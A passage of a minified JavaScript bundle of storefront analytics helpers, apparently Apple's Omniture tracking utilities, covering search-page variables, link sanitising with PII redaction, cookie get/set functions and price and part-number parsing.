_typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.serpPageLoad=function serpPageLoad(){var _commonVars,_objectSpread2,_objectSpread3,_ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},directLanding=_ref.directLanding,keyword=_ref.keyword,intent=_ref.intent,results=_ref.results,channelPrefix=_ref.channelPrefix,curatedKit=_ref.curatedKit,events=new _analyticsOmnitureCollection.OmnitureCollection(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.SEARCH));results||events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.NO_RESULTS)),curatedKit&&events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.CURATED));var channel="".concat((0,_analyticsUtils.toStrTrim)(channelPrefix),":search"),commonVars=(_defineProperty(_commonVars={},_analyticsOmnitureConstants.VARS.PAGE_NAME,"".concat(channel,":").concat((0,_analyticsUtils.toStrTrim)(intent))),_defineProperty(_commonVars,_analyticsOmnitureConstants.VARS.PROP_7,(0,_analyticsUtils.toStrTrim)(keyword).toLowerCase()),_defineProperty(_commonVars,_analyticsOmnitureConstants.VARS.PROP_21,(0,_analyticsUtils.toStrTrim)(results)||"0"),_commonVars);return _objectSpread(_objectSpread({},commonVars),{},directLanding?(_defineProperty(_objectSpread2={},_analyticsOmnitureConstants.VARS.EVAR_2,"D=c7"),_defineProperty(_objectSpread2,_analyticsOmnitureConstants.VARS.EVAR_15,"external (direct)|".concat((0,_analyticsUtils.toStrTrim)(intent))),_defineProperty(_objectSpread2,_analyticsOmnitureConstants.VARS.EVENTS,events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.SERP_DIRECT))),_objectSpread2):(_defineProperty(_objectSpread3={},_analyticsOmnitureConstants.VARS.EVAR_15,"|".concat((0,_analyticsUtils.toStrTrim)(intent))),_defineProperty(_objectSpread3,_analyticsOmnitureConstants.VARS.EVENTS,events),_objectSpread3))}},{"./constants.js":141,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115,"@apple/analytics-utils":190}],149:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.typeToEvents=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_constants=require("./constants.js");exports.typeToEvents=function typeToEvents(type){var events=new _analyticsOmnitureCollection.OmnitureCollection;switch(type){case"quicklinks":events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.COMPLETE)),events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.QUICK_LINK));break;case"suggestions":events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.SUGGESTED));break;case"defaultlinks":events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.COMPLETE)),events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.DEFAULT_LINK))}return events}},{"./constants.js":141,"@apple/analytics-omniture-collection":105}],150:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.formatLink=void 0;var _sanitizeRegion=require("./sanitizeRegion.js"),_sanitizeLink=require("./sanitizeLink.js"),_sanitizeText=require("./sanitizeText.js");exports.formatLink=function formatLink(_ref){var text=_ref.text,href=_ref.href,region=_ref.region,sanitizedText=(0,_sanitizeText.sanitizeText)(text),sanitizedRegion=(0,_sanitizeRegion.sanitizeRegion)(region),limitHref=128-(sanitizedText.length+sanitizedRegion.length+6),sanitizedHref=(0,_sanitizeLink.sanitizeLink)(href,limitHref);return"".concat(sanitizedText).concat(" | ").concat(sanitizedHref).concat(" | ").concat(sanitizedRegion)}},{"./sanitizeLink.js":153,"./sanitizeRegion.js":154,"./sanitizeText.js":155}],151:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"formatLink",{enumerable:!0,get:function get(){return _formatLink.formatLink}}),Object.defineProperty(exports,"sanitizeLink",{enumerable:!0,get:function get(){return _sanitizeLink.sanitizeLink}}),Object.defineProperty(exports,"sanitizeRegion",{enumerable:!0,get:function get(){return _sanitizeRegion.sanitizeRegion}});var _formatLink=require("./formatLink.js"),_sanitizeRegion=require("./sanitizeRegion.js"),_sanitizeLink=require("./sanitizeLink.js")},{"./formatLink.js":150,"./sanitizeLink.js":153,"./sanitizeRegion.js":154}],152:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.removePIIData=void 0;var _index=require("../stringHelpers/index.js"),PII_REGEX=[{expression:/\/order\/detail\/.*/i,value:"/order/detail"},{expression:/\/order\/cancel\/.*/i,value:"/order/cancel"},{expression:/\/order\/guest\/.*/i,value:"/order/guest/******"},{expression:/\/order\/applynow\/ep_payments\/.*/i,value:"/order/applynow/ep_payments/******"},{expression:/\/onMyWay\/.*/i,value:"/onMyWay/******"},{expression:/\/startPickup\/.*/i,value:"/startPickup/******"},{expression:/\/[^/]+@.*/i,value:"/******"},{expression:/W[0-9-]+/,value:"WXXXXXXXX"}];exports.removePIIData=function removePIIData(str){var validStr=(0,_index.toStr)(str),regex=PII_REGEX.find((function(_ref){return _ref.expression.test(validStr)}));return regex?validStr.replace(regex.expression,regex.value):validStr}},{"../stringHelpers/index.js":222}],153:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.sanitizeLink=void 0;var _index=require("../stringHelpers/index.js"),_index2=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../pipe/index.js")),_removePIIData=require("./removePIIData.js");exports.sanitizeLink=function sanitizeLink(str,maxlength){return(0,_index2.default)(_index.trimAllNonPrintable,_removePIIData.removePIIData,_index.trimExtraWhiteSpaces,(0,_index.sliceTrimFactory)(maxlength))(str).toLowerCase()}},{"../pipe/index.js":213,"../stringHelpers/index.js":222,"./removePIIData.js":152}],154:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.sanitizeRegion=void 0;var _sanitizeLink=require("./sanitizeLink.js");exports.sanitizeRegion=function sanitizeRegion(str){return(0,_sanitizeLink.sanitizeLink)(str,40)}},{"./sanitizeLink.js":153}],155:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.sanitizeText=void 0;var _sanitizeLink=require("./sanitizeLink.js");exports.sanitizeText=function sanitizeText(str){return(0,_sanitizeLink.sanitizeLink)(str,50)}},{"./sanitizeLink.js":153}],156:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=_interopRequireDefault(require("../pipe/index.js")),_index2=require("../cookie/index.js"),_getEnvCookieName=_interopRequireDefault(require("./getEnvCookieName.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}var get=(0,_index.default)(_getEnvCookieName.default,_index2.get);exports.default=get},{"../cookie/index.js":175,"../pipe/index.js":213,"./getEnvCookieName.js":157}],157:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function getEnvCookieName(){var cookieName=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";if(!cookieName)return"";var cookieMap=window.cookieMap;return cookieMap&&"object"===_typeof(cookieMap)&&cookieMap[cookieName]||cookieName}},{}],158:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./get.js":156,"./set.js":159}],159:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../cookie/index.js"),_getEnvCookieName=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./getEnvCookieName.js"));exports.default=function set(key,value){var opts=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return(0,_index.set)((0,_getEnvCookieName.default)(key),value,opts)}},{"../cookie/index.js":175,"./getEnvCookieName.js":157}],160:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../pipe/index.js")),_index2=require("../asCookie/index.js"),_index3=require("../jsonEncoder/index.js");var get=(0,_index.default)(_index2.get,_index3.decode);exports.default=get},{"../asCookie/index.js":158,"../jsonEncoder/index.js":193,"../pipe/index.js":213}],161:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./get.js":160,"./set.js":162}],162:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../asCookie/index.js"),_index2=require("../jsonEncoder/index.js");exports.default=function set(key,value,opts){return(0,_index.set)(key,(0,_index2.encode)(value),opts)}},{"../asCookie/index.js":158,"../jsonEncoder/index.js":193}],163:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _getRawNumberFromString=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./getRawNumberFromString.js"));exports.default=function formatPrice(price){var defaultPrice=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"0.00",priceAsNumber=(0,_getRawNumberFromString.default)(price);return null===priceAsNumber?defaultPrice:priceAsNumber.toFixed(2)}},{"./getRawNumberFromString.js":165}],164:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _guessPartNumber=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./guessPartNumber.js"));exports.default=function getPartNumber(){var _ref7=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_ref7$element=_ref7.element,element=void 0===_ref7$element?null:_ref7$element,_ref7$parent=_ref7.parent,parent=void 0===_ref7$parent?null:_ref7$parent,basePartNumber=function getBasePartNumberInfo(_ref){var element=_ref.element,parent=_ref.parent;if(element){var basePartNumber=(element.dataset||{}).basePartNumber;if(basePartNumber)return basePartNumber}if(parent){var _basePartNumber=(parent.dataset||{}).basePartNumber;if(_basePartNumber)return _basePartNumber}return null}({element:element,parent:parent});if(basePartNumber)return basePartNumber;var partNumber=function getPartNumberInfo(_ref4){var element=_ref4.element,parent=_ref4.parent;if(element){var partNumber=(element.dataset||{}).partNumber;if(partNumber)return(0,_guessPartNumber.default)(partNumber)}if(parent){var _partNumber=(parent.dataset||{}).partNumber;if(_partNumber)return(0,_guessPartNumber.default)(_partNumber)}return null}({element:element,parent:parent});return partNumber||null}},{"./guessPartNumber.js":166}],165:[function(require,module,exports){"use strict";function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function getRawNumberFromString(string){if("number"==typeof string)return string;if(!string)return null;if("string"!=typeof string)return null;var _parts=_slicedToArray(string.replace(/[^\d.,]/g,"").split(/[.,](\d{1,2})$/),2),_parts$=_parts[0],integer=void 0===_parts$?"0":_parts$,_parts$2=_parts[1],decimal=void 0===_parts$2?"00":_parts$2,price=parseFloat(integer.replace(/[^\d/]/g,"")+"."+decimal);return isNaN(price)?null:price}},{}],166:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var exceptions=[/^APPLE/,/^HOMEPOD/,/^IMAC/,/^IPAD/,/^IPHONE/,/^IPOD/,/^MAC/,/^PRO/,/^W\d\d_/,/^Z/,/\+/,/GIFT_CARDS/,/^AOS/];exports.default=function guessPartNumber(sku){if(!sku||"string"!=typeof sku)return"";var skuUpperCase=sku.toUpperCase();return exceptions.some((function(regexp){return regexp.test(skuUpperCase)}))?sku:sku.substring(0,5)}},{}],167:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"formatPrice",{enumerable:!0,get:function get(){return _formatPrice.default}}),Object.defineProperty(exports,"getPartNumber",{enumerable:!0,get:function get(){return _getPartNumber.default}}),Object.defineProperty(exports,"getRawNumberFromString",{enumerable:!0,get:function get(){return _getRawNumberFromString.default}}),Object.defineProperty(exports,"guessPartNumber",{enumerable:!0,get:function get(){return _guessPartNumber.default}}),Object.defineProperty(exports,"isBeacon",{enumerable:!0,get:function get(){return _isBeacon.default}}),Object.defineProperty(exports,"isNotEmpty",{enumerable:!0,get:function get(){return _isNotEmpty.default}}),Object.defineProperty(exports,"isValidBeaconKey",{enumerable:!0,get:function get(){return _isValidBeaconKey.default}}),Object.defineProperty(exports,"setValue",{enumerable:!0,get:function get(){return _setValue.default}}),Object.defineProperty(exports,"toBeaconSafeVal",{enumerable:!0,get:function get(){return _toBeaconSafeVal.default}});var _formatPrice=_interopRequireDefault(require("./formatPrice.js")),_getRawNumberFromString=_interopRequireDefault(require("./getRawNumberFromString.js")),_guessPartNumber=_interopRequireDefault(require("./guessPartNumber.js")),_isBeacon=_interopRequireDefault(require("./isBeacon.js")),_isNotEmpty=_interopRequireDefault(require("./isNotEmpty.js")),_setValue=_interopRequireDefault(require("./setValue.js")),_toBeaconSafeVal=_interopRequireDefault(require("./toBeaconSafeVal.js")),_isValidBeaconKey=_interopRequireDefault(require("./isValidBeaconKey.js")),_getPartNumber=_interopRequireDefault(require("./getPartNumber.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./formatPrice.js":163,"./getPartNumber.js":164,"./getRawNumberFromString.js":165,"./guessPartNumber.js":166,"./isBeacon.js":168,"./isNotEmpty.js":169,"./isValidBeaconKey.js":170,"./setValue.js":171,"./toBeaconSafeVal.js":172}],168:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var isBeacon=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../objectHelpers/isObject.js")).default;exports.default=isBeacon},{"../objectHelpers/isObject.js":203}],169:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _isNotEmpty=_interopRequireDefault(require("../objectHelpers/isNotEmpty.js")),_isBeacon=_interopRequireDefault(require("./isBeacon.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}exports.default=function isNotEmpty(beacon){return(0,_isBeacon.default)(beacon)&&(0,_isNotEmpty.default)(beacon)}},{"../objectHelpers/isNotEmpty.js":202,"./isBeacon.js":168}],170:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),validKeys=Object.values(_analyticsOmnitureConstants.VARS);exports.default=function isValidBeaconKey(key){return validKeys.includes(key)}},{"@apple/analytics-omniture-constants":115}],171:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _isBeacon=_interopRequireDefault(require("./isBeacon.js")),_toBeaconSafeVal=_interopRequireDefault(require("./toBeaconSafeVal.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}exports.default=function setValue(beacon,name,value){if(!(0,_isBeacon.default)(beacon)||!name)return beacon;var safeValue=(0,_toBeaconSafeVal.default)(value);return safeValue?beacon[name]=safeValue:delete beacon[name],beacon}},{"./isBeacon.js":168,"./toBeaconSafeVal.js":172}],172:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function toBeaconSafeVal(input){return input&&"object"!==_typeof(input)?String(input):null}},{}],173:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function expiresToDate(expires){if("number"==typeof expires){var date=new Date,offset=24*(expires||0)*60*60*1e3;return date.setTime(date.getTime()+offset),date}return expires}},{}],174:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function get(key){if(null==key)return null;for(var cookies=(document.cookie||"").split(";"),i=0;i<cookies.length;i++){var cookie=(cookies[i]||"").trim();if(cookie.slice(0,key.length+1)==="".concat(key,"="))return decodeURIComponent(cookie.slice(key.length+1))}return null}},{}],175:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./get.js":174,"./set.js":176}],176:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _expiresToDate=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./expiresToDate.js"));exports.default=function set(key,value){var opts=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},expiresOn=(0,_expiresToDate.default)(null==value?-1:opts.expires),expires=expiresOn?"; expires="+expiresOn.toUTCString():"",path=opts.path?"; path="+opts.path:"",domain=opts.domain?"; domain="+opts.domain:"",secure=opts.secure?"; secure":"";document.cookie=key+"="+encodeURIComponent(value||"")+expires+path+domain+secure}},{"./expiresToDate.js":173}],177:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../pipe/index.js")),_index2=require("../cookie/index.js"),_index3=require("../jsonEncoder/index.js");var get=(0,_index.default)(_index2.get,_index3.decode);exports.default=get},{"../cookie/index.js":175,"../jsonEncoder/index.js":193,"../pipe/index.js":213}],178:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./get.js":177,"./set.js":179}],179:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../cookie/index.js"),_index2=require("../jsonEncoder/index.js");exports.default=function set(key,value,opts){return(0,_index.set)(key,(0,_index2.encode)(value),opts)}},{"../cookie/index.js":175,"../jsonEncoder/index.js":193}],180:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function deepClone(obj){if(!obj||"object"!==_typeof(obj))return obj;if(Array.isArray(obj)){for(var _result=Array(obj.length),i=0;i<obj.length;i++)_result[i]=deepClone(obj[i]);return _result}for(var result={},_i=0,_Object$keys=Object.keys(obj);_i<_Object$keys.length;_i++){var key=_Object$keys[_i];result[key]=deepClone(obj[key])}return result}},{}],181:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"default",{enumerable:!0,get:function get(){return _deepClone.default}});var _deepClone=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./deepClone.js"))},{"./deepClone.js":180}],182:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function dispatchEventAsync(target,event){return target instanceof Element&&event instanceof Event&&(setTimeout((function(){target.dispatchEvent(event)}),0),!0)}},{}],183:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function debounce(fn){var wait=arguments.length>1&&void 0!==arguments[1]?arguments[1]:100,timeout=null;return function(){for(var _len=arguments.length,args=new Array(_len),_key=0;_key<_len;_key++)args[_key]=arguments[_key];clearTimeout(timeout),timeout=setTimeout((function(){timeout=null,fn.apply(void 0,args)}),wait)}}},{}],184:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"debounce",{enumerable:!0,get:function get(){return _debounce.default}}),Object.defineProperty(exports,"isNavigationEvent",{enumerable:!0,get:function get(){return _isNavigationEvent.isNavigationEvent}});var _debounce=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./debounce.js")),_isNavigationEvent=require("./isNavigationEvent.js")},{"./debounce.js":183,"./isNavigationEvent.js":185}],185:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.isNavigationEvent=void 0;exports.isNavigationEvent=function isNavigationEvent(){var event=arguments.length>0&&void 0!==arguments[0]?arguments[0]:null;return!(!event||!event.type)&&(function isFormEvent(event){return["analytics-form-submit","submit"].includes(event.type)}(event)||function isClickEvent(event){return"click"===event.type&&event.target&&null!==event.target.closest("a")}(event))}},{}],186:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function getOmniture(){return window.s}},{}],187:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"default",{enumerable:!0,get:function get(){return _getOmniture.default}});var _getOmniture=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./getOmniture.js"))},{"./getOmniture.js":186}],188:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function getRandomInt(){var max=arguments.length>0&&void 0!==arguments[0]?arguments[0]:1e3;return Math.floor(Math.random()*Math.floor(max))}},{}],189:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"default",{enumerable:!0,get:function get(){return _getRandomInt.default}});var _getRandomInt=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./getRandomInt.js"))},{"./getRandomInt.js":188}],190:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.cookieJson=exports.cookie=exports.beaconHelpers=exports.asCookieJson=exports.asCookie=exports.activityMap=void 0,Object.defineProperty(exports,"deepClone",{enumerable:!0,get:function get(){return _index7.default}}),Object.defineProperty(exports,"dispatchEventAsync",{enumerable:!0,get:function get(){return _index8.default}}),exports.eventHelpers=void 0,Object.defineProperty(exports,"getOmniture",{enumerable:!0,get:function get(){return _index10.default}}),Object.defineProperty(exports,"getRandomInt",{enumerable:!0,get:function get(){return _index11.default}}),exports.objectPath=exports.objectHelpers=exports.localStorageJson=exports.localStorage=exports.jsonEncoder=void 0,Object.defineProperty(exports,"pipe",{enumerable:!0,get:function get(){return _index17.default}}),exports.stringHelpers=exports.sessionStorageJson=exports.sessionStorage=void 0,Object.defineProperty(exports,"toStr",{enumerable:!0,get:function get(){return _index20.toStr}}),Object.defineProperty(exports,"toStrTrim",{enumerable:!0,get:function get(){return _index20.toStrTrim}}),exports.urlHelpers=void 0;var activityMap=_interopRequireWildcard(require("./activityMap/index.js"));exports.activityMap=activityMap;var asCookie=_interopRequireWildcard(require("./asCookie/index.js"));exports.asCookie=asCookie;var asCookieJson=_interopRequireWildcard(require("./asCookieJson/index.js"));exports.asCookieJson=asCookieJson;var beaconHelpers=_interopRequireWildcard(require("./beaconHelpers/index.js"));exports.beaconHelpers=beaconHelpers;var cookie=_interopRequireWildcard(require("./cookie/index.js"));exports.cookie=cookie;var cookieJson=_interopRequireWildcard(require("./cookieJson/index.js"));exports.cookieJson=cookieJson;var _index7=_interopRequireDefault(require("./deepClone/index.js")),_index8=_interopRequireDefault(require("./dispatchEventAsync/index.js")),eventHelpers=_interopRequireWildcard(require("./eventHelpers/index.js"));exports.eventHelpers=eventHelpers;var _index10=_interopRequireDefault(require("./getOmniture/index.js")),_index11=_interopRequireDefault(require("./getRandomInt/index.js")),jsonEncoder=_interopRequireWildcard(require("./jsonEncoder/index.js"));exports.jsonEncoder=jsonEncoder;var localStorage=_interopRequireWildcard(require("./localStorage/index.js"));exports.localStorage=localStorage;var localStorageJson=_interopRequireWildcard(require("./localStorageJson/index.js"));exports.localStorageJson=localStorageJson;var objectPath=_interopRequireWildcard(require("./objectPath/index.js"));exports.objectPath=objectPath;var objectHelpers=_interopRequireWildcard(require("./objectHelpers/index.js"));exports.objectHelpers=objectHelpers;var _index17=_interopRequireDefault(require("./pipe/index.js")),sessionStorage=_interopRequireWildcard(require("./sessionStorage/index.js"));exports.sessionStorage=sessionStorage;var sessionStorageJson=_interopRequireWildcard(require("./sessionStorageJson/index.js"));exports.sessionStorageJson=sessionStorageJson;var _index20=_interopRequireWildcard(require("./stringHelpers/index.js"));exports.stringHelpers=_index20;var urlHelpers=_interopRequireWildcard(require("./urlHelpers/index.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function _getRequireWildcardCache(e){if("function"!=typeof WeakMap)return null;var r=new WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function _getRequireWildcardCache(e){return e?t:r})(e)}function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||"object"!=_typeof(e)&&"function"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if("default"!==u&&Object.prototype.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return 